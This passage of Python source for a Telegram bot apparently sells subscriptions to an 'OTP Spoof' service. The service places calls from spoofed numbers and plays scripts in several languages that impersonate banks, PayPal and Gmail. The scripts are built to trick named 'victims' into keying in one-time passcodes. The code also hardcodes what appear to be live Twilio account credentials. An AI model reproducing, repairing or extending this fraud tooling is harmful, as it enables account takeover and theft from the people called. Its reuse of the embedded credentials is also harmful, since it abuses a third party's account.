        keyboard.add(item)
        bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)


@bot.message_handler(commands=['help'])
def how_to_help(message):
    bot.send_message(message.chat.id, "• Contact @m_kZt or @DexTeamUpdates 👑\n\n• Use /faq for more help")
    
    

def checktrial(chat_id1):
    # Send a request to check the trial status
    trial_status_url = f"https://devkithub.com/DexBots/trial/?SearchUserID={chat_id1}"
    response = requests.get(trial_status_url)
    
    if response.text.strip().lower() == "true":
        # If user has a trial, send request to check calls
        check_calls_url = f"https://devkithub.com/DexBots/trial/?checkCalls={chat_id1}"
        response = requests.get(check_calls_url)
        
        if response.text.strip().lower() == "valid":
            # If calls are valid, send request to update calls
            update_calls_url = f"https://devkithub.com/DexBots/trial/?UpdateCalls={chat_id1}"
            response = requests.get(update_calls_url)
            
            if response.text.strip().lower() == "true":
                bot.send_message(chat_id1, "*1 free call credit redeemed successfully *✅",parse_mode='Markdown')
                return "Trial updated successfully."
            else:
                return "Failed to update trial calls."
        else:
            
            if check_expiry_days(chat_id1) == 0:
                bot.send_message(chat_id1, "🔔 *Your trial free calls have expired* \n \n *Press /start to start over* \n\n *Update your subscription to any package and get unlimited calls 😍* ",parse_mode='Markdown')
             
            if check_expiry_days(chat_id1) == 0:
                delete_specific_UserData(chat_id1)  # Delete the user if expiry date is 0
                
    else:
        return "Your trial has expired."

    

@bot.message_handler(commands=['buy'])
def show_buy_message(message):
    buymsg = "🛒 *Purchase Options:*\n\n" \
             "• **Trial** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT--Trial--days) - *LIMITED TO USA*\n" \
             "• **Week** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT----Week) - *Global Calls*\n" \
             "• **Month** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT--Month---Offer-10) - *Global Calls*\n" \
             "• **3 Months** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT---3-Months) - *Global Calls*\n" \
             "• **Lifetime** - [Buy Now](https://dex.sellpass.io/products/OTP-BOT---Lifetime) - ⭐️ *Limited Offer *\n\n\n" \
             "• **Pay As You Go** - [Add Credits](https://dex.sellpass.io/products) -  💴\n\n" \
             "👉 Choose the desired plan and click on the corresponding link to make a purchase.\n" \
             "If you have any questions or need assistance, feel free to reach out to our support team."

    bot.send_message(message.chat.id, buymsg,parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def how_to_help(message):
    url = "https://api.twilio.com/2010-04-01/Accounts/AC442e3ce355352afa300428dbd6cbda4a/Balance.json"

    headers = CaseInsensitiveDict()
    headers["Authorization"] = "Basic QUM0NDJlM2NlMzU1MzUyYWZhMzAwNDI4ZGJkNmNiZGE0YTpmODYyNDg5YzEyNzVkZjBiMzM3Y2E3MTg2YmQ5M2Q1OQ=="

    resp = requests.get(url, headers=headers)

    if resp.status_code == 200:
        data = resp.json()
        balance = data.get("balance")
        currency = data.get("currency")

        if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
            bot.send_message(message.chat.id, f"*Your current balance is* \n\n 💰  `{balance} {currency}` ",parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "You don't have access to do this.")
    else:
        bot.send_message(message.chat.id, "Failed to retrieve balance.")

    print(resp)

@bot.message_handler(commands=['check'])
def search_count(message):
    

        # Extract the activation code using regular expressions
    uid = re.search(r'/check\s+(\w+)', message.text)

    if uid:
        # The activation code is found
        
        fuid = uid.group(1)  # Extract the code from the match object
        
        strixs = f"https://devkithub.com/DexBots/trial/?count=true&userid={fuid}"
        tedt = requests.get(strixs)
        bot.send_message(message.chat.id, f"User {tedt.text} get {tedt.text} calls withing 24 hours")

    else:
        # Extract the activation code using regular expressions
        strixs = f"https://devkithub.com/DexBots/trial/?count=true&userid={message.chat.id}"
        tedt = requests.get(strixs)
        bot.send_message(message.chat.id, f"User {message.chat.id} get {tedt.text} calls withing 24 hours")





@bot.message_handler(commands=['check_payment_coinbase'])
def check_payment_coinbase(message):
    import re
    import coinbase  # Ensure this includes functions for interacting with Coinbase Commerce

    # Extract the charge_code using regular expressions
    match = re.search(r'/check_payment_coinbase\s+(.*)', message.text)
    if match:
        charge_code = match.group(1)

        try:
            # Use the charge_code to check the payment status with Coinbase Commerce
            status,amount,plan = coinbase.check_payment_status(charge_code)  # Adjust to match your implementation

            if status == "done":
                bot.send_message(message.chat.id, f"Payment Complete",parse_mode='Markdown')
                userid = message.chat.id
                
                if status == "done":
                    import user_manage
                    user_manage.update_paygo_status(userid,False)
                    bot.send_message("-1001922379440", f"✅ New Activated Key for {plan} Days \n \n User : [{userid}](tg://user?id={userid}) \n\n Key : `BOT TROUGH PAYMENT`",parse_mode='Markdown')
                    delete_specific_UserData(userid)
                    if amount == 4:
                        import user_manage
                        user_manage.save_trial_user(userid)
                        create_user_test(userid)
                    elif amount == 18:
                        create_user_7days(userid)
                    elif amount == 32:
                        create_user_2weeks(userid)
                    elif amount == 60:
                        create_user_1month(userid)
                    elif amount == 95:
                        create_user_3months(userid)
                    elif amount == 350:
                        create_user_lifetime(userid)
                    else:
                        bot.send_message(message.chat.id, "Invalid amount")

                bot.send_message(message.chat.id, f"New ✅\n\n Subscription * {message.chat.id} * \n \n ⏰ For {plan} days ",parse_mode='Markdown')


            else:
                bot.send_message(message.chat.id, f"{status}",parse_mode='Markdown')

        except Exception as e:
            bot.send_message(message.chat.id, f"Error checking payment status: {str(e)}")

    else:
        bot.send_message(message.chat.id, "Invalid or expired charge code.")




@bot.message_handler(commands=['check_payment'])
def check_payment(message):
    import user_manage
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
            # Extract the activation code using regular expressions
        match = re.search(r'/check_payment\s+(.*)', message.text)
        if match:
            limk = match.group(1)
            import autopay

            status = autopay.check_payment(limk)
            amount = autopay.check_amnt(limk)

           

            if status =="AWAITING_PAYMENT":
                bot.send_message(message.chat.id, f"Your Payment Still Awaiting 🔃\n\nSTATUS : {status}\n\nAmount : {amount} USD\n\nPayment has been created, waiting on customer action")
            elif status =="PENDING":
                bot.send_message(message.chat.id, f"Your Payment Still Pending 🔃\n\nSTATUS : {status}\n\nTransaction detected on the blockchain but not yet confirmed (3)")
            elif status =="EXPIRED":
                bot.send_message(message.chat.id, f"Your Payment link expired ❌\n\nSTATUS : {status}\n\nPayment request expired after 60 minutes")
            elif status =="CANCELLED":
                bot.send_message(message.chat.id, f"Your Payment canclled ❌\n\nSTATUS : {status}\n\nPayment was manually cancelled by the customer")
            elif status =="COMPLETED":
                import user_manage
                import autopay
                
                
                if user_manage.save_payment_id(limk):
                    user_manage.update_paygo_status(message.chat.id,True)
                    user_manage.change_credit(message.chat.id,amount)
                    bot.send_message(message.chat.id, f"Your Payment completed ✅\n\nSTATUS : {status}\n\n🟡 Your credit added succussfully, press /start to continue ")
                else:
                    bot.send_message(message.chat.id, f"Your balance already redeemed ✅")
                
            else:
                bot.send_message(message.chat.id, f"Unknown error happen, contact @m_kZt")


            
        else:
            bot.send_message(message.chat.id, f"Invalid or expired payment ID")
    else:
        bot.send_message(message.chat.id, f"invalid payment ID")

        

@bot.message_handler(commands=['add'])
def search_count(message):
    import user_manage
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
            # Extract the activation code using regular expressions
        match = re.search(r'/add\s+(\w+)\s+(\w+)', message.text)
        fuid = int(match.group(1))
        amt = int(match.group(2))
        user_manage.change_credit(fuid,amt)

        bot.send_message(message.chat.id, f"User {fuid} added {amt} credits")
    else:
        bot.send_message(message.chat.id, f"Fuck u")

        
        
@bot.message_handler(commands=['list'])
def list_users(message):
    import user_manage
    bot.send_message(5983515377, f"{user_manage.list_users()}")
        
       



@bot.message_handler(commands=['active'])
def activate_code(message):
    # Extract the activation code using regular expressions
    activation_code = re.search(r'/active\s+(\w+)', message.text)

    if activation_code:
        # The activation code is found
        code = activation_code.group(1)  # Extract the code from the match object

        # Send a request to the JSON file URL to retrieve the data
        json_url = 'https://devkithub.com/DexBots/serials/serials.json'  # Replace with your JSON file URL
        response = requests.get(json_url)

        if response.status_code == 200:
            try:
                data = response.json()
            except ValueError:
                bot.send_message(message.chat.id, "Something wrong with automatic activation, Please Contact @m_Kzt to active subscription manually")
                return

            time_period = find_key_time_period(data, code)

            if time_period:
                userid = message.chat.id
                message.chat.first_name = ""
                usern = message.chat.first_name
                    
                if time_period:
                    import user_manage
                    user_manage.update_paygo_status(userid,False)
                    bot.send_message("-1001922379440", f"✅ New Activated Key for {time_period} Days \n \n User : [{userid}](tg://user?id={userid}) \n\n Key : `{code}`",parse_mode='Markdown')
                    delete_specific_UserData(userid)
                    if time_period == "2":
                        import user_manage
                        user_manage.save_trial_user(userid)
                        create_user_test(userid)
                    elif time_period == "7":
                        create_user_7days(userid)
                    elif time_period == "30":
                        create_user_1month(userid)
                    elif time_period == "90":
                        create_user_3months(userid)
                    elif time_period == "360":
                        create_user_lifetime(userid)
                    else:
                        bot.send_message(message.chat.id, "Invalid time period")

                bot.send_message(message.chat.id, f"Code * {code} * activated ✅\n\n To user * {message.chat.id} * \n \n ⏰ For {time_period} days ",parse_mode='Markdown')

                # Send a request to deleteactivedkey.php to delete the activated key
                delete_url = f'https://devkithub.com/DexBots/serials/deleteactivedkey.php?key={code}'  # Replace with your deleteactivedkey.php URL
                delete_response = requests.get(delete_url)

                if delete_response.status_code == 200:
                    bot.send_message(message.chat.id, f"Welcome to ｄｅｘ | ｏｔｐ ʙᴏᴛ ❤️ \n\n *Send * /start *to continue*",parse_mode='Markdown')
                    bot.send_message(message.chat.id, 
    "🌟 *Thanks for your purchase with ｄｅｘ Team* 💖\n\n"
    "Exciting News! 🎉,\n"
    "Now you can put a review about our services and get free days on bots & 20% discount store coupon ❤️\n\n"
    "`How to Share Your Review? 🤔`\n\n"
    "🔍 *Step 1:* Open the email used for your purchase.\n"
    "🔍 *Step 2:* Access the mail containing your activation key.\n"
    "🔍 *Step 3:* Follow the link provided in the email.\n"
    "🔍 *Step 4:* Look for the review section located below the activation key.\n"
    "🔍 *Step 5:* Share your thoughts about our services and hit \"Done\" ✅\n\n"
    "🚀 *Once your review is in*, our dedicated team will review your comments, and you'll receive your rewards in your inbox within "
    "_48 hours!_ 💝", parse_mode='Markdown')
                    paidz = f"https://devkithub.com/DexBots/paid/add.php?userId={message.chat.id}"
                    rpo = requests.get(paidz)
                    print(rpo.text)

                
                else:
                    bot.send_message(message.chat.id, f"Failed to delete activated key {code}")
            else:
                bot.send_message(message.chat.id, f"Code {code} not found or already activated")
        else:
            bot.send_message(message.chat.id, "Failed to fetch serial data")
    else:
        # No activation code provided
        bot.send_message(message.chat.id, " *⚠️ No activation code provided. * \n \n *Please use* `/active ACTIVATION_CODE` *to active subscription* \n\n *You can purchase key from @m_KZT or visit* dex.sellpass.io",parse_mode='Markdown')

def find_key_time_period(data, code):
    if isinstance(data, dict):
        for time_period, keys in data.items():
            if isinstance(keys, list):
                for key_data in keys:
                    if isinstance(key_data, dict) and key_data.get('key') == code and not key_data.get('activated'):
                        return time_period

    return None

@bot.message_handler(commands=['gen'])
def generate_key(message):
    # Check if the chat ID is authorized
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
        # Extract the time from the command using regular expressions
        time_match = re.search(r'/gen\s+(\d+)', message.text)

        if time_match:
            # The time is found
            time = time_match.group(1)  # Extract the time from the match object

            # Check if the time is valid (2, 7, 30, or 90)
            if time in ["2", "7", "30", "90", "360"]:
                # Send a request to the autogen.php URL to generate the key
                url = f'https://devkithub.com/DexBots/serials/autogen.php?time={time}'  # Replace with your autogen.php URL
                response = requests.get(url)

                if response.status_code == 200:
                    key = response.text  # Get the generated key from the response

                    # Send the generated key back to Telegram
                    bot.send_message(message.chat.id, f"Generated key for *{time} days ✅ * \n \n * 🔑 Licence Key is * ` {key} ` \n \n * 📲 To active send * `/active {key} ` ",parse_mode='Markdown')
                else:
                    bot.send_message(message.chat.id, "Failed to generate key")
            else:
                bot.send_message(message.chat.id, "Please enter a valid time (2, 7, 30, 90, 360)")
        else:
            # No time provided
            bot.send_message(message.chat.id, "⚠️ No time provided. Please use `/gen TIME` \n\n *Supported times are,* \n \n`/gen 2`\n`/gen 7`\n`/gen 30`\n`/gen 90`\n`/gen 360`     ",parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command. 😅")

@bot.message_handler(commands=['faq'])
def how_faq(message):
    bot.send_message(message.chat.id,
                     "• Please use @DexOTP for tutorial videos, and more helpful information (FAQ > Bot Help). \n\n• Send vouches to @m_kZt \n\n• Buy Here: dex.sellpass.io")


@bot.message_handler(commands=['count'])
def count(message):
    
    count = f"https://devkithub.com/DexBots/add.php?count=true"
    responseOk = requests.get(count)
    print(responseOk.text)
    bot.send_message(message.chat.id,f"➡️ `Registered user count` :: *{responseOk.text}*",parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def getID(message):
    # Get the ID of the replied message, if any
    replied_message_id = None
    if message.reply_to_message:
        replied_message_id = message.reply_to_message.message_id

    # If there's a replied message, send its ID
    if replied_message_id:
        bot.send_message(message.chat.id, f"The ID of the replied message is {replied_message_id}")
    else:
        bot.send_message(message.chat.id, "No message replied.")

@bot.message_handler(commands=['myid'])
def myId(message):
    bot.send_message(message.chat.id, f"Your user ID :  `{message.chat.id}`",parse_mode='Markdown')


@bot.message_handler(commands=['restart'])
def restart(message):
    filename = 'restart.py'

# Generate a random number for the comment
    comment_number = random.randint(1, 1000)

# Check if the file exists
    if not os.path.exists(filename):
        # If the file does not exist, create it and write the comment
        with open(filename, 'w') as file:
            file.write(f'# This is restart.py file with a random number: {comment_number}\n')
    else:
    # If the file already exists, open it and write the comment
        with open(filename, 'a') as file:
            file.write(f'# Another comment with a random number: {comment_number}\n')
    bot.send_message(message.chat.id,f"Bot restarted",parse_mode='Markdown')



@bot.message_handler(commands=['ref'])
def start_trial(message):
    # Get the user's ID
    user_id = message.from_user.id
    
    # Send a request to the trial URL
    
        # Create an inline keyboard
    inline_keyboard = types.InlineKeyboardMarkup()
        
        # Create an inline button with the agreement text
    agreement_button = types.InlineKeyboardButton("Withdraw 💵", callback_data=f"confirm_agreement:{user_id}")
    agreement_button2 = types.InlineKeyboardButton("Add to bot days 🤖", callback_data=f"botdays:{user_id}")
        
        # Add the button to the keyboard
    inline_keyboard.add(agreement_button)
    inline_keyboard.add(agreement_button2)
        
        # Send the inline keyboard with the agreement button

# Calculate the decimal value based on the last digit
    #amnt = round(((ldg + 1) / 10) * 0.6 + 0.1, 3)
    ccc = f"https://devkithub.com/DexBots/ref/index.php?user={user_id}"
    cnt = requests.get(ccc)
    print(cnt.text)

    bot.send_message(message.chat.id, f"🤝 Affiliate program\n\n🏆 Referral (affiliate) program rewards are divided into two levels:\n├ For users who joined the bot using your link - referrals of level 1\n└ For the users, who joined the bot from your referrals links - referrals of the 2nd level\n\n🤑 How much can I earn?\n├ For 1st level referral: 30%\n└ For 2nd level referral: 20%\n\n🥇 Statistics:\n├ Total earned: 0 USD\n└ Personally invited : {cnt.text}\n\n⤵️ Your links:\n└ https://t.me/DexOTPvBot?start={message.chat.id} \n\n 📒 *Join channel @DexTeamUpdates to get promotion massages*", reply_markup=inline_keyboard, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_agreement:"))
def confirm_agreement(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="❌ Withdraw to crypto wallet will be available when the balance will be more than 0 USD \n\npress /ref to get inviting - invite friends and earn on their purchases", parse_mode='Markdown')

    # Edit the original message to show the user's ID
    
@bot.callback_query_handler(func=lambda call: call.data.startswith("botdays:"))
def confirm_agreement(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="❌ This feature will be available when the balance will be more than 0 USD \n\npress /ref to get inviting - invite friends and earn on their purchases", parse_mode='Markdown')

    # Edit the original message to show the user's ID
    




@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Edit access")
def edit_access(message):
    userid = message.from_user.id
    if userid == SUDO_ID or userid == SUDO_ID2:
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 4
        item1 = types.KeyboardButton(text="1 : Add Admin")
        item2 = types.KeyboardButton(text="2 : Add User")
        item3 = types.KeyboardButton(text="3 : Delete Admin")
        item4 = types.KeyboardButton(text="4 : Delete User")
        keyboard.add(item1, item2)
        keyboard.add(item3, item4)
        bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 : Add Admin")
def add_admin(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, save_id_admin)


def save_id_admin(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        adminid = message.text
        create_admin(adminid)
        create_user_lifetime(adminid)
        bot.send_message(message.chat.id, f"Added Admin \n\n"
                                          "Use /start for other functionality\n"
                         )


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "2 : Add User")
def type_of_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 4
        item1 = types.KeyboardButton(text="Test")
        item2 = types.KeyboardButton(text="7 days")
        item3 = types.KeyboardButton(text="1 month")
        item4 = types.KeyboardButton(text="3 months")
        item5 = types.KeyboardButton(text="Lifetime")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        keyboard.add(item5)
        bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Test")
def add_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, createtest_user)
    else:
        bot.send_message(message.chat.id, "You are not an admin.")

def createtest_user(message):
    try:
        if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
            userid = message.text
            create_user_test(userid)
            bot.send_message(message.chat.id, f"Added user for Test calls \n\n"
                                              "Use /start for other functionality\n"
                                              "Goodbye")
        else:
            bot.send_message(message.chat.id, "You are not an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "7 days")
def add_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create7days_user)
    else:
        bot.send_message(message.chat.id, "You are not an admin.")

def create7days_user(message):
    try:
        if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
            userid = message.text
            create_user_7days(userid)
            bot.send_message(message.chat.id, f"Added user for 7 days \n\n"
                                              "Use /start for other functionality\n")
        else:
            bot.send_message(message.chat.id, "You are not an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 month")
def add_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create1month_user)
    else:
        bot.send_message(message.chat.id, "You are not an admin.")

def create1month_user(message):
    try:
        if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
            userid = message.text
            create_user_1month(userid)
            bot.send_message(message.chat.id, f"Added user for 1 month \n\n"
                                              "Use /start for other functionality\n")
        else:
            bot.send_message(message.chat.id, "You are not an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 months")
def add_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create3months_user)
    else:
        bot.send_message(message.chat.id, "You are not an admin.")

def create3months_user(message):
    try:
        if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
            userid = message.text
            create_user_3months(userid)
            bot.send_message(message.chat.id, f"Added user for 3 months \n\n"
                                              "Use /start for other functionality\n")
        else:
            bot.send_message(message.chat.id, "You are not an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Lifetime")
def add_user(message):
    if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create_lifetime_user)
    else:
        bot.send_message(message.chat.id, "You are not an admin.")

def create_lifetime_user(message):
    try:
        if message.from_user.id == SUDO_ID or message.from_user.id == SUDO_ID2:
            userid = message.text
            create_user_lifetime(userid)
            bot.send_message(message.chat.id, f"Added user for Life \n\n"
                                              "Use /start for other functionality\n")
        else:
            bot.send_message(message.chat.id, "You are not an admin.")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 : Delete Admin")
def delete_admin(message):
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter userid: ")
        bot.register_next_step_handler(send, delete_id_admin)


def delete_id_admin(message):
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
        userid = message.text
        delete_specific_AdminData(userid)
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted Admin\n\n"
                                          "Use /start for other functionality")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "4 : Delete User")
def delete_user(message):
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
        send = bot.send_message(message.chat.id, "Enter userid: ")
        bot.register_next_step_handler(send, delete_id_user)


def delete_id_user(message):
    if message.chat.id == SUDO_ID or message.chat.id == SUDO_ID2:
        userid = message.text
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted user\n\n"
                                          "Use /start for other functionality")

import user_manage
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "OTP Spoof 🤖")
def pick_bankotp(message):

    if check_expiry_days(message.chat.id)>0 or user_manage.check_credit_active(int(message.chat.id)):

        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
    
        item1 = types.KeyboardButton(text="Paypal")
        item2 = types.KeyboardButton(text="Gmail")
        item3 = types.KeyboardButton(text="Binance")
        item4 = types.KeyboardButton(text="American Express")
        item5 = types.KeyboardButton(text="Chase Bank")
        item6 = types.KeyboardButton(text="Bank Of America")
        item7 = types.KeyboardButton(text="Apple Pay")
        item8 = types.KeyboardButton(text="Samsung Pay")
        item9 = types.KeyboardButton(text="Wellsfargo Bank")

        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        keyboard.add(item5)
        keyboard.add(item6)
        keyboard.add(item7)
        keyboard.add(item8)
        keyboard.add(item9)

        send = bot.send_message(message.chat.id, "*Reply with a service name or select from list 🏦*",parse_mode='Markdown', reply_markup=keyboard)
        bot.register_next_step_handler(send, nonameotp)
    



def nonameotp(message):
    global bankname
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Call")
    keyboard.add(item1)
    bankname = fetch_bankname(userid)
    send = bot.send_message(message.chat.id, f"📞 *Spoof* : `{twilionumber}`\n💡 *Service* : `{bankname}`\n 📲 *Call to* : `{fetch_phonenumber(userid)}`\n\n 📲 Send *Call* to start call ",
                            parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, askVictimName)
    



def askVictimName(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Skip")
    keyboard.add(item1)
    bot.send_message(message.chat.id, "*Send Victim Name 👤* \n \n ❌ If not want set victim name press *Skip*",parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(message, saveVictimName)

def saveVictimName(message):
    global vicName,numbAc
    userid = message.from_user.id
    reply = str(message.text)
    if reply == "Skip":
        vicName = ""
        bot.send_message(message.chat.id, f"Victim Name not set ✅",parse_mode='Markdown')
    else:
        save_ssnumber(reply, message.chat.id)
        bot.send_message(message.chat.id, f"Victim Name Set as *{reply}* ✅",parse_mode='Markdown')
        vicName = fetch_ssnumber(message.chat.id)
        print(vicName)
    
    askaccountLastDigit(message)

def askaccountLastDigit(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Skip")
    keyboard.add(item1)
    bot.send_message(message.chat.id, "*Send Victim Bank acount last digits 🏦* \n \n ❌ If not want set press *Skip*",parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(message, saveaccountLastDigit)

def saveaccountLastDigit(message):
    global accLast,numbAc
    userid = message.from_user.id
    reply = str(message.text)
    if reply == "Skip":
        accLast = ""
        bot.send_message(message.chat.id, f"Account Last Digit not set ✅",parse_mode='Markdown')
    else:
        save_dlnumber(reply, message.chat.id)
        bot.send_message(message.chat.id, f"Account Last Digit Set as *{reply}* ✅",parse_mode='Markdown')
        numbAc = fetch_dlnumber(message.chat.id)
        accLast = f"credit card ending in {fetch_dlnumber(message.chat.id)}"
        print(accLast)


    select_lang(message)
    




def select_lang(message):
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Choose Voice")

    keyboard.add(item1)

    bot.send_message(message.chat.id, f"⚙️ {name} Select Language & Voice", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Choose Voice")
def langs(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="🇺🇸  English - Female")
    item6 = types.KeyboardButton(text="🇺🇸  English - Male")
    item10 = types.KeyboardButton(text="🇺🇸  English - Male (Service)")
    item2 = types.KeyboardButton(text="🇬🇧  English - Female")
    item4 = types.KeyboardButton(text="🇩🇪  German - Male")
    item5 = types.KeyboardButton(text="🇫🇷  French - Female")
    item7 = types.KeyboardButton(text="🇯🇵  (+81) Japanese - JP")
    item8 = types.KeyboardButton(text="🇨🇳  (+86) Chinese - CN")
    item9 = types.KeyboardButton(text="🇸🇦 Saudi Arabia - Female")
    keyboard.add(item1)
    keyboard.add(item6)
    keyboard.add(item2)
    keyboard.add(item4)
    keyboard.add(item5)
    keyboard.add(item7)
    keyboard.add(item8)
    keyboard.add(item9)
    keyboard.add(item10)
    bot.send_message(message.chat.id, f"Success ✅ \n \n* Choose preferred voice 🔽*",
                            parse_mode='Markdown', reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇨🇳  (+86) Chinese - CN")
def jpSelected(message):
    if True:
        global bankname, vid, vicName,final,invalid,thankyou

        vid = "Takumi"

        final = "我们向您注册的手机号码发送了一次性密码，请在拨号盘中输入该密码以保留此交易。"
        invalid = "选择无效，如需保留该笔交易请按一，否则挂断电话。"
        thankyou = "感谢您的回复，我们已保留您账户的最后一笔交易，感谢您选择我们。"

        msx = f"您好 {vicName}，这是 {bankname} 安全警报。 我们在您的帐户中检测到未经授权的交易。 为了您的安全并防止任何进一步的损失，我们需要您立即关注。 要取消此未经授权的交易，请按 1"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇨🇳  (+86) Chinese - CN` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇯🇵  (+81) Japanese - JP")
def jpSelected(message):
    if True:
        global bankname, vid, vicName,final,invalid,thankyou

        vid = "Takumi"

        final = "ご登録の携帯電話番号にワンタイム パスコードを送信しました。この取引を保留するには、それをダイヤル パッドに入力してください。"
        invalid = "無効な選択です。この取引を保留したい場合は 1 つを押してください。それ以外の場合は電話を切ってください。"
        thankyou = "ご返信ありがとうございます。お客様のアカウントの最後の取引は保留されています。当社をお選びいただきありがとうございます。"

        msx = f"こんにちは、{vicName} さん、これは {bankname} のセキュリティ警告です。 あなたのアカウントで不正な取引が検出されました。 あなたの安全とさらなる損失を防ぐために、直ちに対応していただく必要があります。 この不正な取引をキャンセルするには、1 を押してください"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇯🇵  (+81) Japanese - JP` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')

    
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇺🇸  English - Male")
def usSelected(message):
    if True:
        global bankname, vid, vicName,final,invalid,thankyou

        vid = "Matthew"

        final = "To block this request, please enter the security code that we have sent to your mobile device."
        invalid = "If you want to cancel this transaction please press one, else hang up call."
        thankyou = "please wait while we check the code, Thank you"

